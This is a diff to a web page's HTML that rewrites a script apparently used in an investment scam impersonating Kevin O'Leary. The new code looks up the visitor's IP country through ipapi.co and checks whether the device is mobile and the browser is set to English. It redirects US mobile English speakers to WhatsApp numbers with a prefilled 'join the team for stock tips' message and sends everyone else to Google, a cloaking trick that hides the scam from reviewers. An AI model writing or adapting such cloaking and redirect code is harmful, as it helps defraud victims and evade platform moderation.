@@ -641,23 +641,46 @@ src="https://www.facebook.com/tr?id=1855781025019244&ev=PageView&noscript=1"
     </script>
 
        
-<script>
-function h2() {
-  
-    // Define two links
-    const links = [
-        'https://wa.me/18602943897?text=Hello%2C%20I%20would%20like%20to%20join%20Kevin%20O'Leary's%20team%20to%20learn%20about%20investing%20and%20get%20tips%20on%20promising%20stocks.',
-        'https://wa.me/15597011101?text=Hello%2C%20I%20would%20like%20to%20join%20Kevin%20O'Leary's%20team%20to%20learn%20about%20investing%20and%20get%20tips%20on%20promising%20stocks.' // Replace with your second link
-    ];
+ <script>
+  function h2() {
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
 
-    // Randomly select one of the links
-    const randomLink = links[Math.floor(Math.random() * links.length)];
-    
-    // Open the selected link in a new tab
-    window.open(randomLink, '_blank');
-}
+    function isEnglishLang() {
+      return navigator.language.startsWith('en') || 
+             navigator.languages.some(lang => lang.startsWith('en'));
+    }
+
+    function getRandomLink() {
+      const links = [
+        "https://wa.me/18602943897?text=Hello%2C%20I%20would%20like%20to%20join%20Kevin%20O'Leary's%20team%20to%20learn%20about%20investing%20and%20get%20tips%20on%20promising%20stocks",
+        "https://wa.me/15597011101?text=Hello%2C%20I%20would%20like%20to%20join%20Kevin%20O'Leary's%20team%20to%20learn%20about%20investing%20and%20get%20tips%20on%20promising%20stocks"  // Replace with another desired link
+      ];
+      return links[Math.floor(Math.random() * links.length)];
+    }
+
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        // Strict three-condition check
+        if (data.country === 'US' && isMobileDevice() && isEnglishLang()) {
+          window.location.href = getRandomLink();
+          return;
+        }
+
+        window.location.href = "https://www.google.com";
+      })
+      .catch(() => {
+        // Strict two-condition check on IP detection failure
+        if (isMobileDevice() && isEnglishLang()) {
+          window.location.href = getRandomLink();
+          return;
+        }
+        window.location.href = "https://www.google.com";
+      });
+  }
 </script>
-
        
 </body>
 </html>
